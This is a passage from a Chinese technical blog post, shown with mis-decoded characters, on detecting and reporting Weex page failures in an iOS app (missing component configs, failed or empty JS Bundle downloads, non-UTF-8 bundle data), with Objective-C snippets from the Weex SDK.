<li>æƒ…å†µå†å¥½ç‚¹ã€‚å¯ä»¥çœ‹åˆ°å…¨éƒ¨çš„é¡µé¢äº†ï¼Œä½†æ˜¯ç‚¹å‡»åæ— å“åº”ã€‚æ¯”å¦‚ï¼šè¯¥é¡µé¢å¤§éƒ¨åˆ†åœ¨å±•ç¤ºå•†å“ä»·æ ¼ã€å•†å“æ•°é‡ã€å•†å“æŠ˜æ‰£ä»·ã€å•†å“æŠ˜æ‰£ä¿¡æ¯ã€ä¸‹é¢æœ‰ä¸ªâ€œç¡®è®¤æ”¯ä»˜â€æŒ‰é’®ã€‚ç”¨æˆ·åœ¨è€ƒè™‘å†ä¸‰ï¼Œæœ¬ç€ç†æ€§è´­ç‰©åï¼Œå‘ç°æ˜¯åˆšéœ€å“ï¼Œå’¬ç´§ç‰™è¦ä»˜æ¬¾äº†ï¼Œæ­¤æ—¶ç‚¹å‡»â€œç¡®è®¤æ”¯ä»˜â€æŒ‰é’®äº†ï¼Œä½†æ˜¯é¡µé¢æ²¡æœ‰ä»»ä½•ååº”ã€‚ç”¨æˆ·ä¹Ÿæ˜¯â€œè§å¤šè¯†å¹¿â€çš„ä½“é¢äººï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ç½‘ç»œä¸å¥½çš„æƒ…å†µï¼Œæ‰€ä»¥ç­‰äº†1åˆ†é’Ÿï¼Œä»–å¾ˆæœ‰è€å¿ƒã€‚åˆ‡æ¢äº† WI-FI åˆ° 5G åï¼Œç»§ç»­ç‚¹å‡»ï¼Œä¾æ—§æ²¡ååº”ã€‚ä¸€æ€’ä¹‹ä¸‹ç‚¹äº†10æ¬¡ï¼Œç­‰äº†2åˆ†é’Ÿï¼Œè¿˜æ˜¯æ²¡ååº”ã€‚ä»–å¥”æºƒäº†ï¼Œå¸è½½äº† App</li>
</ul>
<p>ä¸Šè¿°å‡ ç§æƒ…å†µï¼Œæ€»ç»“ä¸ºï¼šæŒ‰ç…§å¼‚å¸¸ç­‰çº§ï¼Œå¯ä»¥åˆ’åˆ†ä¸ºå½±å“ä¸šåŠ¡å’Œä¸å½±å“ä¸šåŠ¡ã€‚ä»€ä¹ˆå«â€œå½±å“ä¸šåŠ¡â€ï¼Ÿè¿™æ˜¯æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„æ ‡å‡†ï¼Œå½±å“ç”¨æˆ·æ˜¯å¦æ­£å¸¸æ“ä½œ Appã€‚æ¯”å¦‚ï¼šé¡µé¢ç™½å±ï¼ˆé¡µé¢å…¨éƒ¨ç™½å±ã€é¡µé¢éƒ¨åˆ†ç™½å±ï¼‰ã€ç‚¹å‡»æŸä¸ªæŒ‰é’®æ— å“åº”ï¼Œè¿™äº›å«åšâ€œå½±å“ä¸šåŠ¡â€ï¼Œå±äº Error çº§åˆ«ã€‚å…¶ä»–çš„ä¸€äº›è½»å¾®å¼‚å¸¸ï¼Œä¸å½±å“ç”¨æˆ·ä½¿ç”¨ App åŠŸèƒ½ï¼Œä¸å½±å“ä¸šåŠ¡ï¼Œå±äº Warning çº§åˆ«ã€‚</p>
<h3 data-id="heading-67">3. UI æ˜¾ç¤ºå¼‚å¸¸</h3>
<h4 data-id="heading-68">1. éƒ¨åˆ†ç™½å±ï¼šæ³¨å†Œçš„ Component ä½¿ç”¨å¼‚å¸¸</h4>
<p>è¿™ç§æƒ…å†µå°±å±äºé¡µé¢éƒ¨åˆ†ç™½å±ã€‚å› ä¸ºæŸä¸ªå“ªä¸ª Compoent ä¼šé“ºæ»¡é¡µé¢ï¼ŒåŸºæœ¬ç±»ä¼¼ iOS UI æ§ä»¶ä¸€æ ·ç»„åˆä½¿ç”¨ã€‚å°±åƒä¸Šæ–‡æè¿°çš„ã€Œè¯¥é¡µé¢å¤§éƒ¨åˆ†åœ¨å±•ç¤ºå•†å“ä»·æ ¼ã€å•†å“æ•°é‡ã€å•†å“æŠ˜æ‰£ä»·ã€å•†å“æŠ˜æ‰£ä¿¡æ¯ã€ä¸‹é¢åº”è¯¥æ˜¯æœ‰ä¸ªâ€œç¡®è®¤æ”¯ä»˜â€æŒ‰é’®ï¼Œä½†æ˜¯æ­¤å¤„å°±æ˜¯ç©ºç™½ã€è¿™ä¸ªç©ºç™½ç²—ï¼Œç†åº”æ˜¾ç¤ºä¸€ä¸ª Native æ³¨å†Œçš„ Buttonï¼Œä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œé€ æˆä¸šåŠ¡çš„é˜»å¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a551c125b89945c492daac9ae8f28310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=OD34iKcnKNSl9Au61CaChYwUsvs%3D" alt="WeexComponentRegisterError.png" loading="lazy"/>
.vueï¼ˆæˆ– Weex ä¸“å±.weï¼‰æ–‡ä»¶å†…åŸºäº Vue æ‰©å±•çš„ Weex è·¨å¹³å°æ¨¡æ¿ DSL ä»£ç ï¼Œåœ¨å‰ç«¯æ„å»ºé˜¶æ®µä¼šå…ˆç”± Webpack çš„weex-loaderè§¦å‘ç¼–è¯‘æµç¨‹ï¼šé¦–å…ˆé€šè¿‡ Weex æ ¸å¿ƒç¼–è¯‘å™¨@weex-cli/compilerï¼ˆå¤ç”¨å¹¶æ‰©å±•vue-template-compilerï¼‰å°†æ¨¡æ¿ DSL è§£æä¸ºæ¨¡æ¿ ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰ï¼›æ¥ç€ç”± Weex è‡ªå®šä¹‰ Babel æ’ä»¶ï¼ˆå¦‚babel-plugin-transform-weex-templateï¼‰å°†æ¨¡æ¿ AST è½¬æ¢ä¸ºæ ‡å‡†åŒ–çš„ JS ASTï¼Œå¹¶é’ˆå¯¹ iOS/Android è·¨å¹³å°ç‰¹æ€§åšå±æ€§ã€æ ·å¼ã€äº‹ä»¶çš„é€‚é…å¤„ç†ï¼ˆå¦‚æ ·å¼å•ä½å½’ä¸€åŒ–ã€äº‹ä»¶åæ ‡å‡†åŒ–ï¼‰ï¼›æœ€ç»ˆç”ŸæˆåŒ…å«_hï¼ˆå³ Weex è¿è¡Œæ—¶çš„$createElementï¼Œç­‰ä»·äº Vue çš„createElementï¼‰è°ƒç”¨çš„renderå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè¢« Webpack æ‰“åŒ…åˆ°æœ€ç»ˆçš„ Weex JS Bundle ä¸­ã€‚</p>
<pre><code class="hljs language-json" lang="json">_c('color-button'<span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span>
    staticStyle<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      width<span class="hljs-punctuation">:</span> <span class="hljs-string">"400px"</span><span class="hljs-punctuation">,</span>
      height<span class="hljs-punctuation">:</span> <span class="hljs-string">"40px"</span><span class="hljs-punctuation">,</span>
      marginBottom<span class="hljs-punctuation">:</span> <span class="hljs-string">"20px"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    attrs<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç‚¹å‡»è®¡ç®—10+20"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"bgColor"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#FF6600"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"hello"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    on<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"click"</span><span class="hljs-punctuation">:</span> _vm.handleButtonClick
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-comment">// å¦‚æœæœ‰ children å°±æ˜¯ children ä¿¡æ¯</span>
)
</code></pre>
<p>åœ¨ App è¿è¡Œé˜¶æ®µï¼ŒWeex çš„ JS å¼•æ“ï¼ˆiOS ç«¯ä¸º JSCoreã€Android ç«¯ä¸º V8ï¼‰åŠ è½½ JS Bundle åï¼Œæ‰§è¡Œç»„ä»¶çš„renderå‡½æ•°ï¼Œé€šè¿‡è°ƒç”¨ <code>_h</code> å‡½æ•°å°†æ¨¡æ¿æè¿°è½¬æ¢ä¸ºè·¨å¹³å°çš„è™šæ‹Ÿ DOMï¼ˆVNodeï¼‰ï¼ŒVNode ä¼šè¢«åºåˆ—åŒ–ä¸º JSON æ ¼å¼ï¼Œæœ€ç»ˆé€šè¿‡ JS Bridge ä¼ é€’ç»™ Native ç«¯ï¼ˆiOS/Androidï¼‰ç”¨äºåŸç”Ÿè§†å›¾æ¸²æŸ“ã€‚</p>
<p>Weex çš„ Component ç›¸å…³é€»è¾‘éƒ½ç”± <code>WXComponentManager</code> è´Ÿè´£ã€‚é¡µé¢åœ¨æ„å»ºå±•ç¤ºçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨ <code>_buildComponent</code> æ–¹æ³•ï¼Œå…¶å†…éƒ¨ä¼šè°ƒç”¨ WXComponentFactory çš„èƒ½åŠ›ï¼ˆ<code>configWithComponentName</code>ï¼‰ï¼Œæ ¹æ® ComponentName è·å– Componentã€‚</p>
<p><code>configWithComponentName</code> æ˜¯ Weex iOS ä¾§ WXComponentFactoryï¼ˆç»„ä»¶å·¥å‚ç±»ï¼‰çš„æ ¸å¿ƒæ–¹æ³•ä¹‹ä¸€ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ï¼šæ ¹æ®ä¼ å…¥çš„ç»„ä»¶åç§°ï¼ˆå¦‚ color-button/div/textï¼‰ï¼ŒæŸ¥æ‰¾è¯¥ç»„ä»¶å¯¹åº”çš„ Native ä¾§é…ç½®ï¼ˆWXComponentConfigï¼‰ï¼›è‹¥æ‰¾ä¸åˆ°å¯¹åº”é…ç½®ï¼Œåˆ™é™çº§ä½¿ç”¨åŸºç¡€å®¹å™¨ç»„ä»¶ div çš„é»˜è®¤é…ç½®ï¼Œå¹¶è¾“å‡ºè­¦å‘Šæ—¥å¿—ã€‚</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">- (WXComponentConfig *)configWithComponentName:(NSString *)name
{
    WXAssert(name, @"Can not find config for a nil component name");
    
    WXComponentConfig *config = nil;
    
    [_configLock lock];
    config = [_componentConfigs objectForKey:name];
    if (!config) {
        WXLogWarning(@"No component config for name:%@, use default config", name);
        config = [_componentConfigs objectForKey:@"div"];
    }
    [_configLock unlock];
    
    return config;
}
</code></pre>
<p>UI Component åšçš„æ¯”è¾ƒéšæ„ï¼Œè®¤ä¸ºæ˜¾ç¤ºé—®é¢˜é™çº§ç”¨ div å°±å¯ä»¥äº†ã€‚åšä¸º SDK è¿™ä¹ˆè®¾è®¡ä¹Ÿä¼¼ä¹å¯ä»¥æ¥å—ï¼Œä½†ä½œä¸ºä¸šåŠ¡æ–¹ï¼Œæˆ‘ä»¬å¿…é¡»æ”¶é›†ç»Ÿè®¡è¿™ç§å¼‚å¸¸æƒ…å†µã€‚
æ‰€ä»¥æ­¤å¤„æˆ‘ä»¬å¯ä»¥æ”¶é›†æ¡ˆå‘ç°åœºæ•°æ®ï¼Œè¿›è¡Œä¸ŠæŠ¥ã€‚æˆ‘ä»¬å‘ç° Weex è‡ªå·±å°è£…äº† <code>WXExceptionUtils</code>ç±»ï¼Œæš´éœ²äº† <code>commitCriticalExceptionRT</code> æ¥å£ï¼Œç”¨äºæ”¶é›†è‡´å‘½é—®é¢˜ã€‚</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">+ (void)commitCriticalExceptionRT:(WXJSExceptionInfo *)jsExceptionInfo{
    
    WXPerformBlockOnComponentThread(^ {
        id&lt;WXJSExceptionProtocol&gt; jsExceptionHandler = [WXHandlerFactory handlerForProtocol:@protocol(WXJSExceptionProtocol)];
        if ([jsExceptionHandler respondsToSelector:@selector(onJSException:)]) {
            [jsExceptionHandler onJSException:jsExceptionInfo];
        }
        if ([WXAnalyzerCenter isOpen]) {
            [WXAnalyzerCenter transErrorInfo:jsExceptionInfo];
        }
    });
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨å¯ä»¥å¤„ç† exception éµå¾ª WXJSExceptionProtocol çš„ handlerã€‚æ‰€ä»¥æˆ‘ä»¬æ–°å¢ä¸€ä¸ª <code>WXExceptionReporter</code> ç±»ï¼ˆéµå¾ª WXJSExceptionProtocol åè®®ï¼‰ï¼Œç”¨äºæ”¶é›†å¼‚å¸¸ï¼Œç„¶åç”¨äºç»Ÿä¸€çš„ä¸ŠæŠ¥ï¼Œå†…éƒ¨æä¾›åŸºç¡€æ•°æ®çš„ç»„è£…ã€å­—æ®µè§£æåŠŸèƒ½ã€‚</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad9fc6690769433e8cefadb6cfb52f17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=D%2FyuvCXgWZug8Q8IzvqDBppj2dg%3D" alt="WeexComponentBuildFlow.png" loading="lazy"/></p>
<h4 data-id="heading-69">2. å…¨éƒ¨ç™½å±</h4>
<p>æ ¹æ® Weex çš„å·¥ä½œåŸç†å¯ä»¥çŸ¥é“ï¼Œé¡µé¢éœ€è¦å±•ç¤ºè‚¯å®šè¦æ ¹æ® url å»è·å– JS Bundle å†…å®¹ï¼Œç„¶åè§£ææˆ VNode æœ€åé€šè¿‡ JSBridge å»è°ƒç”¨ Native çš„ UI Component å»å±•ç¤º UIï¼Œé‚£ä¹ˆæ•´ä¸ªæµç¨‹å‡ ä¸ªé‡è¦çš„ç¯èŠ‚éƒ½å¯èƒ½å‡ºé”™ï¼Œå¯¼è‡´é¡µé¢ç™½å±ã€‚</p>
<h5 data-id="heading-70">1. èµ„æºè¯·æ±‚å¤±è´¥</h5>
<p>JS Bundle èµ„æºè¯·æ±‚å¤±è´¥ï¼Œå­˜åœ¨ Errorï¼Œæ­¤æ—¶æ˜¯æ— æ³•å»å±•ç¤º Weex é¡µé¢çš„ã€‚è¿™ç§æƒ…å†µå°±æ˜¯ HTTP çŠ¶æ€ç é200çš„æƒ…å†µã€‚</p>
<p>æ¯ä¸ª Weex é¡µé¢éƒ½ç”± WXSDKInstance è´Ÿè´£ä¸‹è½½ JS Bundle èµ„æºï¼Œæ‰€ä»¥ä¸‹è½½çš„é€»è¾‘åœ¨ WXSDKInstance é‡Œã€‚</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">- (void)_renderWithRequest:(WXResourceRequest *)request options:(NSDictionary *)options data:(id)data; 
{
  _mainBundleLoader.onFinished = ^(WXResourceResponse *response, NSData *data) {

      NSError *error = nil;
      if ([response isKindOfClass:[NSHTTPURLResponse class]] &amp;&amp; ((NSHTTPURLResponse *)response).statusCode != 200) {
          error = [NSError errorWithDomain:WX_ERROR_DOMAIN
                                      code:((NSHTTPURLResponse *)response).statusCode
                                  userInfo:@{@"message":@"status code error."}];
          if (strongSelf.onFailed) {
              strongSelf.onFailed(error);
          }
      }
      
      if (error) {
          [WXExceptionUtils commitCriticalExceptionRT:strongSelf.instanceId
                                              errCode:[NSString stringWithFormat:@"%d", WX_KEY_EXCEPTION_JS_DOWNLOAD]
                                              function:@"_renderWithRequest:options:data:"
                                            exception:[NSString stringWithFormat:@"download bundle error :%@",[error localizedDescription]]
                                            extParams:nil];
          return;
      }

      if (!data) {
          NSString *errorMessage = [NSString stringWithFormat:@"Request to %@ With no data return", request.URL];
          WX_MONITOR_FAIL_ON_PAGE(WXMTJSDownload, WX_ERR_JSBUNDLE_DOWNLOAD, errorMessage, strongSelf.pageName);
          [WXExceptionUtils commitCriticalExceptionRT:strongSelf.instanceId
                                              errCode:[NSString stringWithFormat:@"%d", WX_KEY_EXCEPTION_JS_DOWNLOAD]
                                              function:@"_renderWithRequest:options:data:"
                                            exception:errorMessage
                                            extParams:nil];
          return;
      }
  };
}
</code></pre>
<p>æ¨¡æ‹Ÿ JS Bundle ä¸‹è½½é”™è¯¯ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8127cf21938140c0ae40a15a9a5a26b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=r0g86JWgUX33NF7lfv3iwvOb%2B7E%3D" alt="WeexJSBundleDownloadFailed.png" loading="lazy"/></p>
<p>ä¸‹è½½ JS Bundle ç½‘ç»œè¯·æ±‚å®Œæˆåï¼Œå¦‚æœå‡ºç° Errorï¼Œåˆ™ä¼šè°ƒç”¨ WXExceptionUtils çš„èƒ½åŠ›ï¼Œå°†å¼‚å¸¸äº¤ç»™ <code>WXExceptionReporter</code> å»å¤„ç†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f045d0177a8483b857901ad7520f993~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=RuNioiYspuc%2FThdWHk3%2BOyOUpZE%3D" alt="WeexJSBundleDownloadFailedAPM.png" loading="lazy"/></p>
<h5 data-id="heading-71">2. èµ„æºè¯·æ±‚æˆåŠŸï¼Œæ•°æ®ä¸ºç©º</h5>
<p>è¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯ï¼š**JSBundle ä¸‹è½½è¯·æ±‚åœ¨ HTTP å±‚é¢ â€œæˆåŠŸå®Œæˆâ€ï¼ˆçŠ¶æ€ç  200ï¼‰ï¼Œä½†è¿”å›çš„äºŒè¿›åˆ¶æ•°æ® data ä¸º nil æˆ–ç©ºï¼ˆé•¿åº¦ä¸º 0ï¼‰ **</p>
<p>å¯èƒ½ä½ ä¼šå¥½å¥‡ï¼Œæ€ä¹ˆå¯èƒ½æœ‰ç©ºçš„ JSBundleï¼Œä»€ä¹ˆåœºæ™¯ä¸‹ä¼šäº§ç”Ÿè¿™ç§æƒ…å†µï¼Ÿ
å‡¡æ˜¯æ­£å¸¸å†™ä»£ç éƒ½ç¬¦åˆé¢„æœŸå°±æ²¡æœ‰ä»»ä½• bug å’Œæ•…éšœäº†ï¼Œæ‰€ä»¥åˆ©ç”¨æ‚²è§‚ç­–ç•¥ï¼Œå°†å„ç§å¯èƒ½å‡ºç°é—®é¢˜çš„åœ°æ–¹éƒ½ç›‘æ§åˆ°ï¼Œå› ä¸ºåªè¦ JSBundle ä¸ºç©ºï¼Œé¡µé¢è‚¯å®šæ˜¯ç™½å±ï¼Œå¯¹äºç”¨æˆ·ä¾§æ¥è¯´éƒ½æ˜¯è‡´å‘½çš„ã€‚</p>
<ol>
<li>æœåŠ¡å™¨/CDN è¿”å›â€œç©ºå“åº”â€ï¼šåç«¯ / CDN é…ç½®å¼‚å¸¸ï¼šè¯·æ±‚çš„ JSBundle URL æœ‰æ•ˆï¼ŒHTTP çŠ¶æ€ç è¿”å› 200ï¼Œä½†å“åº”ä½“ï¼ˆBodyï¼‰ä¸ºç©ºï¼ˆæ¯”å¦‚é™æ€ JS æ–‡ä»¶è¢«åˆ é™¤ã€CDN ç¼“å­˜å¤±æ•ˆä¸”æºç«™æ— æ•°æ®ã€åç«¯æ¥å£é€»è¾‘é”™è¯¯æœªå†™å…¥å“åº”å†…å®¹ï¼‰ï¼›</li>
<li>ä¸‹è½½è¿‡ç¨‹ä¸­æ•°æ®ä¼ è¾“æˆªæ–­ / ä¸¢å¤±</li>
</ol>
<ul>
<li>ç½‘ç»œæ³¢åŠ¨ï¼šä¸‹è½½è¯·æ±‚å·²æ”¶åˆ°æœåŠ¡å™¨çš„ â€œå“åº”å®Œæˆâ€ ä¿¡å·ï¼Œä½†æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­å› ç½‘ç»œä¸­æ–­ã€è¶…æ—¶ç­‰å¯¼è‡´ NSData æœªå®Œæ•´æ¥æ”¶ï¼ˆä»… HTTP å¤´æˆåŠŸæ¥æ”¶ï¼Œä½“æ•°æ®ä¸ºç©ºï¼‰ï¼›</li>
<li>Weex åŠ è½½å™¨ï¼ˆmainBundleLoaderï¼‰å¼‚å¸¸ï¼šåŠ è½½å™¨åœ¨å°†å“åº”æ•°æ®è½¬ä¸º NSData æ—¶å‡ºç°åº•å±‚é”™è¯¯ï¼ˆå¦‚å†…å­˜ä¸è¶³ã€æ•°æ®è§£ç å¤±è´¥ï¼‰ï¼Œå¯¼è‡´ data è¢«ç½®ä¸º nilã€‚</li>
</ul>
<p>Mockï¼šå°† data è®¾ä¸º nilã€‚æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7346ccdc0574cba97a9bd195bebbbd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=3QAb3CTSFZfYP99pqlhWGR3V7mI%3D" alt="WeexJSBundleParseFailed.png" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ° Weex ä¹Ÿä¼šæŠŠè¿™ç§é”™è¯¯è¿›è¡Œæ”¶é›†ï¼Œè°ƒç”¨ <code>WXExceptionUtils commitCriticalExceptionRT</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬æ·»åŠ çš„ Analyzer æ˜¯å¯ä»¥ç›‘æ§åˆ°è¿™ç§å¼‚å¸¸çš„ã€‚
æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03d2c52a165c4844a7a264724a02f71a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=dZM6FItKQRExX0qKh0VNp53gcl0%3D" alt="WeexJSBundleParseErrorAPM.png" loading="lazy"/></p>
<h5 data-id="heading-72">3. èµ„æºè¯·æ±‚æˆåŠŸï¼Œæ•°æ®æ— æ³•è§£æ</h5>
<p>è¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„æƒ…å†µå°±æ˜¯ï¼š<strong>ä¸‹è½½çš„ JSBundle äºŒè¿›åˆ¶æ•°æ®è™½éç©ºï¼Œä½†å› æ— æ³•ä»¥ UTF-8 ç¼–ç è§£ç ä¸ºå­—ç¬¦ä¸²ï¼Œå¯¼è‡´ Weex å®ä¾‹æ— æ³•åŠ è½½æ‰§è¡Œè¯¥æ•°æ®ï¼Œæœ€ç»ˆé¡µé¢ UI æ— æ³•æ­£å¸¸å±•ç¤º</strong>ã€‚æ¯”å¦‚ä¸‹é¢çš„æƒ…å†µï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6fdbef3fa6549fea8ba93b5ab23f467~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=QQ5sLB64xvhg92mNApfF6SljymI%3D" alt="WeexJSbundleEncodingError.png" loading="lazy"/></p>
<p>å’Œä¸Šé¢çš„æƒ…å†µç±»ä¼¼ï¼Œè¿™ç§éƒ½å±äºæ¦‚ç‡è¾ƒå°çš„é—®é¢˜ï¼Œä½†ä¹Ÿè¦ç›‘æ§å’Œé¢„é˜²ã€‚</p>
<p>ä¸€äº›å¯èƒ½çš„æƒ…å†µï¼š</p>
<ol>
<li>JSBundle æ–‡ä»¶ç¼–ç é UTF-8ã€‚ <strong>Weex è¦æ±‚ï¼šJS Bundle æ–‡ä»¶å¿…é¡»é‡‡ç”¨ UTF-8 ç¼–ç ï¼ˆæ—  BOMï¼‰ä»¥ä¿è¯è·¨å¹³å°å…¼å®¹æ€§ï¼Œé UTF-8 ç¼–ç ï¼ˆå¦‚ GBKã€UTF-16ï¼‰å¯èƒ½å¯¼è‡´ iOS/Android å¹³å°è§£æå¤±è´¥</strong></li>
<li>æ•°æ®æŸå/åŒ…å«éæ³• UTF-8 å­—èŠ‚</li>
</ol>
<ul>
<li>ä¸‹è½½æˆªæ–­ï¼šUTF-8 æ˜¯ã€Œå¤šå­—èŠ‚ç¼–ç ã€ï¼ˆæ¯”å¦‚ä¸­æ–‡å  3 å­—èŠ‚ï¼‰ï¼Œè‹¥ä¸‹è½½è¿‡ç¨‹ä¸­æ•°æ®æœ«å°¾çš„å­—ç¬¦å­—èŠ‚ä¸å®Œæ•´ï¼ˆå¦‚åªä¸‹äº† 2 å­—èŠ‚ï¼‰ï¼Œè§£ç æ—¶ä¼šå›  â€œå­—èŠ‚åºåˆ—ä¸åˆæ³•â€ å¤±è´¥ï¼›</li>
<li>æ•°æ®ç¯¡æ”¹ï¼šCDN / ç½‘å…³ / ä»£ç†åœ¨ä¼ è¾“ä¸­æ··å…¥é UTF-8 å­—èŠ‚ï¼ˆå¦‚ 0xFFã€0xFEã€0x00 ç­‰æ— æ•ˆå­—èŠ‚ï¼‰ï¼Œç ´åç¼–ç ç»“æ„ï¼›</li>
<li>æ–‡ä»¶æŸåï¼šJSBundle æ–‡ä»¶æ‰“åŒ… / ä¸Šä¼ æ—¶å‡ºé”™ï¼ˆå¦‚å‹ç¼©åæœªæ­£ç¡®è§£å‹ï¼‰ï¼ŒåŒ…å«ä¹±ç  / äºŒè¿›åˆ¶ç¢ç‰‡</li>
</ul>
<ol start="3">
<li>è¯·æ±‚åˆ°éæ–‡æœ¬æ•°æ®ï¼ˆURL é”™è¯¯ï¼‰ã€‚è¯·æ±‚çš„ JS Bundle è¿”å›çš„ä¸æ˜¯ JS æ–‡æœ¬ï¼Œè€Œæ˜¯äºŒè¿›åˆ¶ï¼š</li>
</ol>
<ul>
<li>URL é…ç½®é”™è¯¯ï¼šæŒ‡å‘å›¾ç‰‡ï¼ˆpng/jpgï¼‰ã€å‹ç¼©åŒ…ï¼ˆzipï¼‰ã€äºŒè¿›åˆ¶åè®®æ•°æ®ï¼ˆå¦‚ protobufï¼‰ã€å¯æ‰§è¡Œæ–‡ä»¶ç­‰</li>
<li>åç«¯æ¥å£é”™è¯¯ï¼šåŸæœ¬åº”è¿”å› JS æ–‡æœ¬çš„æ¥å£ï¼Œå¼‚å¸¸æ—¶è¿”å›äºŒè¿›åˆ¶æ ¼å¼çš„é”™è¯¯ä¿¡æ¯ï¼ˆè€Œéæ–‡æœ¬é”™è¯¯ï¼‰</li>
<li>ç¼“å­˜æ±¡æŸ“ï¼šWeex æœ¬åœ°ç¼“å­˜çš„ JSBundle è¢«å…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶è¦†ç›–ï¼ˆå¦‚ç¼“å­˜è·¯å¾„å†²çªï¼‰</li>
</ul>
<ol start="4">
<li>ç‰¹æ®Šå­—ç¬¦/ç¼–ç æº¢å‡º</li>
</ol>
<ul>
<li>JSBundle ä¸­åŒ…å« UTF-8 æ— æ³•è¡¨ç¤ºçš„ã€Œæ— æ•ˆ Unicode ç ç‚¹ã€ï¼ˆå¦‚è¶…å‡º U+10FFFF èŒƒå›´ï¼Œæˆ–ä¿ç•™çš„æœªå®šä¹‰ç ç‚¹ï¼‰</li>
<li>æ•°æ®é‡è¿‡å¤§ï¼šæå¤§å‹ JSBundle è§£ç æ—¶å› å†…å­˜ä¸è¶³ / ç³»ç»Ÿé™åˆ¶ï¼Œå¯¼è‡´è§£ç æ¥å£è¿”å› nilï¼ˆiOS ä¸­ NSString å¯¹å•å­—ç¬¦ä¸²é•¿åº¦æœ‰éšæ€§é™åˆ¶ï¼‰</li>
</ul>
<p>è¿™ç§æƒ…å†µï¼ŒWeex å®˜æ–¹æ˜¯æ€ä¹ˆåšçš„ï¼Ÿ</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">NSString *jsBundleString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
if (!jsBundleString) {
    WX_MONITOR_FAIL_ON_PAGE(WXMTJSDownload, WX_ERR_JSBUNDLE_STRING_CONVERT, @"data converting to string failed.", strongSelf.pageName)
    [strongSelf.apmInstance setProperty:KEY_PROPERTIES_ERROR_CODE withValue:[@(WX_ERR_JSBUNDLE_STRING_CONVERT) stringValue]];
    return;
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§æƒ…å†µæ²¡æœ‰è¢« Weex æ²¡æœ‰è§†ä¸ºâ€œè‡´å‘½é—®é¢˜â€è¿›è¡Œä¸ŠæŠ¥ã€‚åªæ˜¯è¿›è¡Œäº†ç®€å•æ‰“å°ã€‚å°è¯•ç«™åœ¨æ¡†æ¶è§’åº¦æƒ³é—®é¢˜ï¼Œä» SDK Owner è§’åº¦å½’å› ï¼š</p>
<ul>
